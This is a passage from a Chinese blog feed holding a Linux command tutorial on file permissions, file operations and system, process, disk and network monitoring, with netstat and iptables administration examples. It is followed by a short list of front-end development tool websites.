与-f合用,表示在进程ID,PID死掉之后结束</li><li>-q, –quiet, –silent 从不输出给出文件名的首部</li><li>-s, –sleep-interval=S 与-f合用,表示在每次反复的间隔休眠S秒</li></ul><p><strong>示例</strong></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uw6q1s5dj30jq0583zj.jpg" alt="image-20191213103608175">  </p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uw809qtgj30ji06dmyd.jpg" alt="image-20191213103723510">  </p><p>一般我们及时使用-f参数实时监控服务器日志。</p><h2 id="ll命令"><a href="#ll命令" class="headerlink" title="ll命令"></a>ll命令</h2><p>ll并不是linux下一个基本的命令，它实际上是ls -l的一个别名。</p><p>Ubuntu默认不支持命令ll，必须用 ls -l，这样使用起来不是很方便。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uwrunmhcj30fl0apgnx.jpg" alt="image-20191213105629006">  </p><p><strong>1、文件类型</strong></p><ul><li>“-”表示普通文件；</li><li>“d”表示目录；</li><li>“l”表示链接文件；</li><li>“p”表示管理文件；</li><li>“b”表示块设备文件；</li><li>“c”表示字符设备文件；</li><li>“s”表示套接字文件；</li></ul><p><strong>2、文件属性</strong></p><ul><li>r（Read，读取权限）：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。</li><li>w（Write，写入权限）：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。</li><li>x（eXecute，执行权限）：对文件而言，具有执行文件的权限；对目录来说，该用户具有进入目录的权限。<br>另外，这里还有2个很特殊的属性，平时不怎么</li><li>s或S（SUID,Set UID）：可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。</li><li>t或T（Sticky）：/tmp和 /var/tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。</li></ul><p><strong>3、目录/文件个数</strong></p><p>对于目录文件，表示它的第一级子目录的个数。注意此处看到的值要减2才等于该目录下的子目录的实际个数。4</p><p><strong>4、所有者/分组</strong></p><p>表示该文件的所有者/创建者（owner）及其所在的组（group）。</p><p><strong>5、文件大小</strong></p><p>如果是文件，则表示该文件的大小，单位为字节。<br>如果是目录，则表示该目录符所占的大小，并不表示该目录下所有文件的大小。</p><p><strong>6、修改日期</strong></p><p>该文件最后修改的日期时间。</p><p><strong>7、文件名称</strong></p><h2 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h2><p>用户组权限修改  </p><blockquote><p>chgrp work docServer/</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glanohvvwzj30gw082abq.jpg" alt="image-20201203143431237">  </p><p>拥有者权限更改  </p><blockquote><p>chown work docServer/</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glanr157amj30gk0bnq5g.jpg" alt="image-20201203143658616">  </p><h2 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h2><p>centos下的<code>ln</code>命令就相当于window下的建立快捷方式，链接文件甚至可以链接不存在的文件，这就产生一般称之为”断链”的现象，链接文件甚至可以循环链接自己。 类似于编程语言中的递归。<br>软链接文件只是其源文件的一个标记，当删除了源文件后，链接文件不能独立存在，虽然仍保留文件名，但却不能查看软链接文件的内容了。</p><p>ln -s 源文件 目标文件</p><pre><code>ln -s /opt/soft/node-v8.9.0-linux-x64/bin/vuepress /usr/bin</code></pre><p>-s 是代号（symbolic）的意思</p><ol><li>ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化</li><li>ln的链接又软链接 和硬链接两种，软链接就是ln -s xx xx,它只会在你选定的位置上生成一个文件的镜像，不会占用磁盘空间，硬链接ln ,没有参数-s, 它会在你选定的位置上生成一个和源文件大小相同的文件，无论是软链接还是硬链接，文件都保持同步变化。</li></ol><p><strong>参数</strong></p><ul><li>-b 删除，覆盖以前建立的链接</li><li>-d 允许超级用户制作目录的硬链接</li><li>-f 强制执行</li><li>-i 交互模式，文件存在则提示用户是否覆盖</li><li>-n 把符号链接视为一般目录</li><li>-s 软链接(符号链接)</li><li>-v 显示详细的处理过程</li></ul><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>cp [选项] 源文件（source） 目标文件或者目录（destination）</p><ul><li>-a: 是指archive的意思，也说是指复制所有的目录</li><li>-d: 若源文件为连接文件(link file)，则复制连接文件属性而非文件本身</li><li>-f: 强制(force)，若有重复或其它疑问时，不会询问用户，而强制复制</li><li>-i: 若目标文件(destination)已存在，在覆盖时会先询问是否真的操作</li><li>-l: 建立硬连接(hard link)的连接文件，而非复制文件本身</li><li>-p: 与文件的属性一起复制，而非使用默认属性</li><li>-r: 递归复制，用于目录的复制操作</li><li>-s: 复制成符号连接文件(symbolic link)，即“快捷方式”文件</li><li>-u: 若目标文件比源文件旧，更新目标文件</li></ul><blockquote><p>cp -f package.json ./backup</p></blockquote><h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>mv [选项] source destination</p><ul><li>-f: force，强制直接移动而不询问</li><li>-i: 若目标文件(destination)已经存在，就会询问是否覆盖</li><li>-u: 若目标文件已经存在，且源文件比较新，才会更新</li></ul><h1 id="系统监控命令"><a href="#系统监控命令" class="headerlink" title="系统监控命令"></a>系统监控命令</h1><h2 id="内存监控"><a href="#内存监控" class="headerlink" title="内存监控"></a>内存监控</h2><h3 id="free命令"><a href="#free命令" class="headerlink" title="free命令"></a>free命令</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ux9t78zdj30kj022t8x.jpg" alt="image-20191213111344785">  </p><p>Linux free命令用于显示内存状态。</p><p>free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。</p><p><strong>语法</strong></p><pre><code>free [-bkmotV][-s &lt;间隔秒数&gt;]</code></pre><p><strong>参数说明</strong>：</p><ul><li><p>-b 　以Byte为单位显示内存使用情况。</p></li><li><p>-k 　以KB为单位显示内存使用情况。</p></li><li><p>-m 　以MB为单位显示内存使用情况。</p></li><li><p>-h 　以合适的单位显示内存使用情况，最大为三位数，自动计算对应的单位值。单位有：</p><pre><code>B = bytesK = kilosM = megasG = gigasT = teras</code></pre></li><li><p>-o 　不显示缓冲区调节列。</p></li><li><p>-s&lt;间隔秒数&gt; 　持续观察内存使用状况。</p></li><li><p>-t 　显示内存总和列。</p></li><li><p>-V 　显示版本信息。</p></li></ul><p>Men：表示物理内存统计</p><p>Swap：表示硬盘上交换分区的使用情况</p><p>total：表示物理内存总数(total=used+free)<br>used：表示系统分配给缓存使用的数量(这里的缓存包括buffer和cache)<br>free：表示未分配的物理内存总数<br>shared：表示共享内存<br>buffers：系统分配但未被使用的buffers 数量。<br>cached：系统分配但未被使用的cache 数量。<br>-/+ buffers/cache：表示物理内存的缓存统计</p><p>(-buffers/cache) 内存数： (指的第一部分Mem行中的used – buffers – cached)<br>(+buffers/cache) 内存数: (指的第一部分Mem行中的free + buffers + cached)<br>(-buffers/cache)表示真正使用的内存数， (+buffers/cache) 表示真正未使用的内存数</p><h3 id="vmstat命令"><a href="#vmstat命令" class="headerlink" title="vmstat命令"></a>vmstat命令</h3><p>vmstat（Virtual Meomory Statistics，虚拟内存统计）是对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息。  </p><p>常用命令</p><blockquote><p>vmstat 2 2 【在2秒时间内进行2次采样】</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v2bks9exj30ky02udg9.jpg" alt="image-20191213140826375">    </p><p><strong>参数</strong></p><p>Procs（进程）：</p><ul><li>r：运行队列中进程数量</li><li>b：等待IO的进程数量</li></ul><p>Memory（内存）：</p><ul><li>swpd: 使用虚拟内存大小</li><li>free: 可用内存大小</li><li>buff: 用作缓冲的内存大小</li><li>cache: 用作缓存的内存大小</li></ul><p>Swap：</p><ul><li>si: 每秒从交换区写到内存的大小</li><li>so: 每秒写入交换区的内存大小</li></ul><p>IO：（现在的Linux版本块的大小为1024bytes）</p><ul><li>bi: 每秒读取的块数</li><li>bo: 每秒写入的块数</li></ul><p>system（系统）：</p><ul><li>in: 每秒中断数，包括时钟中断。【interrupt】</li><li>cs: 每秒上下文切换数。    【count/second】</li></ul><p>CPU（以百分比表示）：</p><ul><li>us: 用户进程执行时间(user time)</li><li>sy: 系统进程执行时间(system time)</li><li>id: 空闲时间(包括IO等待时间),中央处理器的空闲时间 。以百分比表示。</li><li>wa: 等待IO时间</li></ul><h2 id="CPU监控"><a href="#CPU监控" class="headerlink" title="CPU监控"></a>CPU监控</h2><h3 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h3><p>top命令可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具</p><p>使用权限：所有使用者。</p><p><strong>语法</strong></p><pre><code>top [-] [d delay] [q] [c] [S] [s] [i] [n] [b]</code></pre><p><strong>参数说明</strong>：</p><ul><li><p>d : 改变显示的更新速度，或是在交谈式指令列( interactive command)按 s</p></li><li><p>q : 没有任何延迟的显示速度，如果使用者是有 superuser 的权限，则 top 将会以最高的优先序执行</p></li><li><p>c : 切换显示模式，共有两种模式，一是只显示执行档的名称，另一种是显示完整的路径与名称S : 累积模式，会将己完成或消失的子行程 ( dead child process ) 的 CPU time 累积起来</p></li><li><p>s : 安全模式，将交谈式指令取消, 避免潜在的危机</p></li><li><p>i : 不显示任何闲置 (idle) 或无用 (zombie) 的行程</p></li><li><p>n : 更新的次数，完成后将会退出 top</p></li><li><p>b : 批次档模式，搭配 “n” 参数一起使用，可以用来将 top 的结果输出到档案内</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uxeei4bbj30l709haby.jpg" alt="image-20191213111809397">  </p></li></ul><h3 id="mpstat命令"><a href="#mpstat命令" class="headerlink" title="mpstat命令"></a>mpstat命令</h3><p>mpstat是 Multiprocessor Statistics的缩写，是实时系统监控工具。其报告与CPU的一些统计信息，这些信息存放在/proc/stat文件中。在多CPU系统里，其不但能查看所有CPU的平均状况信息，而且能够查看特定CPU的信息。</p><p>常用命令</p><blockquote><p>mpstat -P ALL 2   【ALL表示显示所有CPUs，也可以指定某个CPU；2表示刷新间隔】</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v2jtlf4jj30o804jwf7.jpg" alt="image-20191213141621315">    </p><p><strong>参数</strong></p><ul><li>CPU：处理器ID</li><li>%usr    在internal时间段里，用户态的CPU时间（%），不包含 nice值为负进程    </li><li>%nice    在internal时间段里，nice值为负进程的CPU时间（%）    </li><li>%sys    在internal时间段里，核心时间（%）    </li><li>%iowait    在internal时间段里，硬盘IO等待时间（%）    </li><li>%irq    在internal时间段里，硬中断时间（%）</li><li>%soft    在internal时间段里，软中断时间（%）    </li><li>%steal    显示虚拟机管理器在服务另一个虚拟处理器时虚拟CPU处在非自愿等待下花费时间的百分比    </li><li>%guest    显示运行虚拟处理器时CPU花费时间的百分比</li><li>%idle  在internal时间段里，CPU除去等待磁盘IO操作外的因为任何原因而空闲的时间闲置时间（%）</li></ul><h2 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h2><h3 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h3><p>ps命令用于查看进程统计信息</p><p>常用参数：</p><ul><li>a：显示当前终端下的所有进程信息，包括其他用户的进程。</li><li>u：使用以用户为主的格式输出进程信息。</li><li>x：显示当前用户在所有终端下的进程。</li><li>-e：显示系统内的所有进程信息。</li><li>-l：使用长（long）格式显示进程信息。</li><li>-f：使用完整的（full）格式显示进程信息。</li></ul><h4 id="ps-aux"><a href="#ps-aux" class="headerlink" title="ps -aux"></a>ps -aux</h4><p>最常用的方法是ps -aux,然后再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uxjysmvcj30kb07b0u3.jpg" alt="image-20191213112328721">  </p><p>列说明：</p><ul><li>USER：    用户名</li><li>PID：    进程ID（Process ID）</li><li>%CPU：    进程的cpu占用率</li><li>%MEM：    进程的内存占用率</li><li>VSZ：    进程所使用的虚存的大小（Virtual Size）</li><li>RSS：    进程使用的驻留集大小或者是实际内存的大小，Kbytes字节。</li><li>TTY：    与进程关联的终端（tty）</li><li>STAT：    进程的状态：进程状态使用字符表示的（STAT的状态码）</li><li>TIME：    进程使用的总cpu时间</li><li>COMMAND：    正在执行的命令行命令</li></ul><h4 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h4><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uxl2r4k5j30gb077jsi.jpg" alt="image-20191213112434230">  </p><ul><li>UID：    用户ID（User ID）</li><li>PID：    进程ID（Process ID）</li><li>PPID：    父进程的进程ID（Parent Process id）</li><li>STIME：    启动时间</li><li>TTY：    与进程关联的终端（tty）</li><li>TIME：    进程使用的总cpu时间</li><li>CMD：    正在执行的命令行命令</li></ul><h4 id="ps-ef-grep"><a href="#ps-ef-grep" class="headerlink" title="ps -ef | grep"></a>ps -ef | grep</h4><p>| 符号，是个管道符号，表示ps 和 grep 命令同时执行；</p><p>grep 命令是查找（Global Regular Expression<br>Print），能使用正则表达式搜索文本，然后把匹配的行显示出来；</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uxq8o30hj30lb0aggoe.jpg" alt="image-20191213112931855">  </p><h4 id="ps-l"><a href="#ps-l" class="headerlink" title="ps -l"></a>ps -l</h4><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uxlwmsd3j30id02a74m.jpg" alt="image-20191213112521888">  </p><ul><li>F： 代表这个程序的旗标 (flag)， 4 代表使用者为 super user</li><li>S： 睡眠    Sleeping                休眠中, 受阻, 在等待某个条件的形成或接受到信号。</li><li>UID：    用户ID（User ID）</li><li>PID：    进程ID（Process ID）</li><li>PPID：    父进程的进程ID（Parent Process id）</li><li>C：     CPU 使用的资源百分比</li><li>PRI： 这个是 Priority (优先执行序) 的缩写，详细后面介绍</li><li>NI： 这个是 Nice 值，在下一小节我们会持续介绍</li><li>ADDR： 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 “-“</li><li>SZ： 使用掉的内存大小</li><li>WCHAN： 目前这个程序是否正在运作当中，若为 - 表示正在运作</li><li>TTY： 登入者的终端机位置</li><li>TIME： 使用掉的 CPU 时间。</li><li>CMD 所下达的指令为何</li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>查看进程的启动时间：<br> ps -eo lstart 启动时间</p><p>查看进程的运行时间<br> ps -eo etime   运行多长时间.</p><p>查看进程的pid、启动时间、运行时间<br> ps -eo pid,lstart,etime | grep [ pid ]</p><h3 id="pstree命令"><a href="#pstree命令" class="headerlink" title="pstree命令"></a>pstree命令</h3><p>以树状图的方式展现进程之间的派生关</p><ul><li><p>pstree -p 显示当前所有进程的进程号和进程id</p></li><li><p>pstree  -a 显示所有进程的所有详细信息，遇到相同的进程名可以压缩显示。</p></li></ul><h3 id="pidof命令"><a href="#pidof命令" class="headerlink" title="pidof命令"></a>pidof命令</h3><p>查找正在运行进程的PID</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v320q1poj30cr01idfz.jpg" alt="image-20191213143350781">  </p><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p><strong>uptime</strong>：显示系统总共运行了多长时间和系统的平均负载</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v35f9346j30hy01e0sx.jpg" alt="image-20191213143707179">  </p><p> <strong>pmap：</strong>比较专业的查看内存与进程对应关系工具</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v37qjjsyj30d705ggm5.jpg" alt="image-20191213143920584">  </p><h2 id="磁盘监控"><a href="#磁盘监控" class="headerlink" title="磁盘监控"></a>磁盘监控</h2><h3 id="df命令"><a href="#df命令" class="headerlink" title="df命令"></a>df命令</h3><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9uy49v1paj30ef058gma.jpg" alt="image-20191213114301424">  </p><ul><li>df -h查看磁盘使用情况</li><li>df -i 查看inode使用情况</li></ul><h3 id="du命令"><a href="#du命令" class="headerlink" title="du命令"></a>du命令</h3><p>Linux du命令用于显示目录或文件的大小。</p><p>du会显示指定的目录或文件所占用的磁盘空间。</p><p><strong>参数说明</strong>：</p><ul><li>-a或-all 显示目录中个别文件的大小。</li><li>-b或-bytes 显示目录或文件大小时，以byte为单位。</li><li>-c或–total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。</li><li>-D或–dereference-args 显示指定符号连接的源文件大小。</li><li>-h或–human-readable 以K，M，G为单位，提高信息的可读性。</li><li>-H或–si 与-h参数相同，但是K，M，G是以1000为换算单位。</li><li>-k或–kilobytes 以1024 bytes为单位。</li><li>-l或–count-links 重复计算硬件连接的文件。</li><li>-L&lt;符号连接&gt;或–dereference&lt;符号连接&gt; 显示选项中所指定符号连接的源文件大小。</li><li>-m或–megabytes 以1MB为单位。</li><li>-s或–summarize 仅显示总计。</li><li>-S或–separate-dirs 显示个别目录的大小时，并不含其子目录的大小。</li><li>-x或–one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。</li><li>-X&lt;文件&gt;或–exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。</li><li>–exclude=&lt;目录或文件&gt; 略过指定的目录或文件。</li><li>–max-depth=&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。</li><li>–help 显示帮助。</li><li>–version 显示版本信息。</li></ul><h3 id="iostat命令"><a href="#iostat命令" class="headerlink" title="iostat命令"></a>iostat命令</h3><p>ostat是一个用于收集显示系统存储设备输入和输出状态统计的简单工具。这个工具常常用来追踪存储设备的性能问题，其中存储设备包括设备、本地磁盘，以及诸如使用NFS等的远端磁盘。</p><p>常用命令：</p><blockquote><p>iostat -x -k 2 100 # 2表示刷新间隔，100表示刷新次数</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v3c24jbvj30un04rt9c.jpg" alt="image-20191213144330124"></p><p>iostat主要是用来监控磁盘I/O，首先输出了CPUs的平均数据（avg-cpu），我们可以看%iowait这一项，除此之外iostat还提供了一些更详细的I/O状态数据</p><p><strong>参数</strong></p><ul><li>/s: 每秒完成的读 I/O 设备次数。</li><li>w/s: 每秒完成的写 I/O 设备次数。</li><li>rkB/s: 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节。</li><li>wkB/s: 每秒写K字节数.是 wsect/s 的一半。</li><li>avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。</li><li>avgqu-sz: 平均I/O队列长度。</li><li>await: 平均每次设备I/O操作的等待时间 (毫秒)。</li><li>svctm: 平均每次设备I/O操作的服务时间 (毫秒)。</li><li>%util: 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的。</li></ul><h2 id="网络监控"><a href="#网络监控" class="headerlink" title="网络监控"></a>网络监控</h2><h3 id="sar命令"><a href="#sar命令" class="headerlink" title="sar命令"></a>sar命令</h3><p>SAR是一个在Unix和Linux操作系统中用来收集、报告和保存CPU、内存、输入输出端口使用情况的命令。SAR命令可以动态产生报告，也可以把报告保存在日志文件中。</p><p>常用命令</p><blockquote><p>sar -n DEV 3 100</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v3q8h1dvj30n504odgh.jpg" alt="image-20191213145707669">  </p><p><strong>参数</strong></p><ul><li>IFACE：网络设备的名称</li><li>rxpck/s：每秒钟接收到的包数目</li><li>txpck/s：每秒钟发送出去的包数目</li><li>rxkB/s：每秒钟接收到的字节数</li><li>txkB/s：每秒钟发送出去的字节数</li></ul><h3 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h3><p>netstat命令一般用于检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据。</p><p>配置参数</p><ul><li>-a, –all, –listening 显示所有连接中的Socket。</li><li>-n, –numeric 以数字形式显示地址和端口号。</li><li>-t, -–tcp 显示TCP传输协议的连线状况。</li><li>-u, -–udp 显示UDP传输协议的连线状况。</li><li>-p, –programs 显示正在使用socket的程序名/进程ID</li><li>-l, –listening 显示监控中的服务器的Socket。</li><li>-o, –timers 显示计时器。</li><li>-s, –statistics 显示每个网络协议的统计信息(比如SNMP)</li><li>-i, –interfaces 显示网络界面信息表单（网卡列表）</li><li>-r, –route 显示路由表</li></ul><p>常用命令</p><blockquote><p> netstat -aup  【输出所有UDP连接状况】</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9v3tkcm4ej30ol059t9i.jpg" alt="image-20191213150018810">  </p><ul><li>netstat -aup # 输出所有UDP连接状况</li><li>netstat -atp # 输出所有TCP连接状况</li><li>netstat -s # 显示各个协议的网络统计信息</li><li>netstat -i # 显示网卡列表</li><li>netstat -r # 显示路由表信息</li></ul><pre class="line-numbers language-shell"><code class="language-shell">查看所有80端口的连接数netstat -nat|grep -i “80”|wc -l对连接的IP按连接数量进行排序netstat -anp | grep ‘tcp\|udp’ | awk ‘{print $5}’ | cut -d: -f1 | sort | uniq -c | sort -nnetstat -ntu | awk ‘{print $5}’ | cut -d: -f1 | sort | uniq -c | sort -nnetstat -ntu | awk ‘{print $5}’ | egrep -o “[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}” | sort | uniq -c | sort -nr查看TCP连接状态netstat -nat |awk ‘{print $6}’|sort|uniq -c|sort -rnnetstat -n | awk ‘/^tcp/ {print $NF}’|sort|uniq -c|sort -rnnetstat -n | awk ‘/^tcp/ {++S[$NF]};END {for(a in S) print a, S[a]}’netstat -n | awk ‘/^tcp/ {++state[$NF]}; END {for(key in state) print key,”\t”,state[key]}’netstat -n | awk ‘/^tcp/ {++arr[$NF]};END {for(k in arr) print k,”\t”,arr[k]}’netstat -ant | awk ‘{print $NF}’ | grep -v ‘[a-z]’ | sort | uniq -c查看80端口连接数最多的20个IPcat /www/web_logs/wzfou.com_access.log|awk ‘{print $1}’|sort|uniq -c|sort -nr|head -100tail -n 10000 /www/web_logs/wzfou.com_access.log|awk ‘{print $1}’|sort|uniq -c|sort -nr|head -100cat /www/web_logs/wzfou.com_access.log|awk ‘{print $1}’|sort|uniq -c|sort -nr|head -100netstat -anlp|grep 80|grep tcp|awk ‘{print $5}’|awk -F: ‘{print $1}’|sort|uniq -c|sort -nr|head -n20netstat -ant |awk ‘/:80/{split($5,ip,”:”);++A[ip[1]]}END{for(i in A) print A,i}’ |sort -rn|head -n20用tcpdump嗅探80端口的访问看看谁最高tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F”.” ‘{print $1″.”$2″.”$3″.”$4}’ | sort | uniq -c | sort -nr |head -20查找较多time_wait连接netstat -n|grep TIME_WAIT|awk ‘{print $5}’|sort|uniq -c|sort -rn|head -n20查找较多的SYN连接netstat -an | grep SYN | awk ‘{print $5}’ | awk -F: ‘{print $1}’ | sort | uniq -c | sort -nr | morelinux下实用iptables封ip段的一些常见命令：封单个IP的命令是：iptables -I INPUT -s 211.1.0.0 -j DROP封IP段的命令是：iptables -I INPUT -s 211.1.0.0/16 -j DROPiptables -I INPUT -s 211.2.0.0/16 -j DROPiptables -I INPUT -s 211.3.0.0/16 -j DROP封整个段的命令是：iptables -I INPUT -s 211.0.0.0/8 -j DROP封几个段的命令是：iptables -I INPUT -s 61.37.80.0/24 -j DROPiptables -I INPUT -s 61.37.81.0/24 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重启网络"><a href="#重启网络" class="headerlink" title="重启网络"></a>重启网络</h3><blockquote><p>service network restart </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端辅助开发工具</title>
      <link href="2020/12/30/fetool/"/>
      <url>2020/12/30/fetool/</url>
      
        <content type="html"><![CDATA[<h2 id="阿里矢量图库"><a href="#阿里矢量图库" class="headerlink" title="阿里矢量图库"></a>阿里矢量图库</h2><p><a href="https://www.iconfont.cn/" target="_blank" rel="noopener">传送门</a>  </p><p>包含非常丰富的图标</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1am38an7j30yo0gzgnb.jpg" alt="image-20201226153243842">  </p><h2 id="Orion矢量图库"><a href="#Orion矢量图库" class="headerlink" title="Orion矢量图库"></a>Orion矢量图库</h2><p><a href="https://orioniconlibrary.com/all-icons" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1bv3alaxj30xf0hj0v2.jpg" alt="image-20201226161556500">  </p><h2 id="carbon"><a href="#carbon" class="headerlink" title="carbon"></a>carbon</h2><p><a href="https://carbon.now.sh/" target="_blank" rel="noopener">传送门</a> </p><p>非常优美的代码编辑模块，可以辅助我们在写PPT等文档截取代码块的时候不再是模糊的截图，可直接使用这个公共copy代码块，非常清晰。如下图：</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1arke9chj31cm0lc431.jpg" alt="image-20201226153759842"></p><h2 id="codepen"><a href="#codepen" class="headerlink" title="codepen"></a>codepen</h2><p><a href="https://codepen.io/" target="_blank" rel="noopener">传送门</a>  </p><p>CodePen 则是前端开发者们约“码”的天堂。它不仅提供给你了一个 Showcase 的平台，而且能够开拓你的视野 —— 你能够及时的了解最新前端技术的应用，同时帮助交互设计师找寻更多的灵感。</p><p>附上大佬总结的优秀作品 <a href="https://zhuanlan.zhihu.com/p/24969846" target="_blank" rel="noopener">传送门</a></p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1ay78vp4j30xz0iyaf2.jpg" alt="image-20201226154421799"></p><h2 id="UI界面配色"><a href="#UI界面配色" class="headerlink" title="UI界面配色"></a>UI界面配色</h2><p><a href="http://www.flatcolorsui.com/" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1b3vcbzej30vo0byaav.jpg" alt="image-20201226154948835">  </p><h2 id="CSS渐变"><a href="#CSS渐变" class="headerlink" title="CSS渐变"></a>CSS渐变</h2><p><a href="https://uigradients.com/#Html" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1esgyij1j30xv087n1o.jpg" alt="image-20201226175715668">  </p><h2 id="web小工具集合"><a href="#web小工具集合" class="headerlink" title="web小工具集合"></a>web小工具集合</h2><p><a href="https://www.sojson.com/web/" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1c3u0jruj30rt0ewgoa.jpg" alt="image-20201226162421962">  </p><h2 id="前端兼容性查询工具"><a href="#前端兼容性查询工具" class="headerlink" title="前端兼容性查询工具"></a>前端兼容性查询工具</h2><p><a href="https://www.caniuse.com/" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1dvv5yb2j30vb0bugo4.jpg" alt="image-20201226172554885">  </p><h2 id="EnjoyCss编辑器"><a href="#EnjoyCss编辑器" class="headerlink" title="EnjoyCss编辑器"></a>EnjoyCss编辑器</h2><p><a href="https://enjoycss.com/" target="_blank" rel="noopener">传送门</a>  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1e68pf8cj30t70e2t9q.jpg" alt="image-20201226173554173">  </p><h2 id="CodeSandBox"><a href="#CodeSandBox" class="headerlink" title="CodeSandBox"></a>CodeSandBox</h2><p><a href="https://codesandbox.io/s" target="_blank" rel="noopener">传送门</a>  </p><p>提供一个在校开发环境的沙盒，即开即用、实时编译预览。</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1fr8eixdj30xn0h8tav.jpg" alt="image-20201226183040410">  </p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm1frs6wo7j30y40gpjtz.jpg" alt="image-20201226183112123">  </p>]]></content>
      
      
      <categories>
          
          <category> 工具类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> icon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GMTC大前端技术演变</title>
      <link href="2020/12/30/GMTC/"/>
      <url>2020/12/30/GMTC/</url>
      
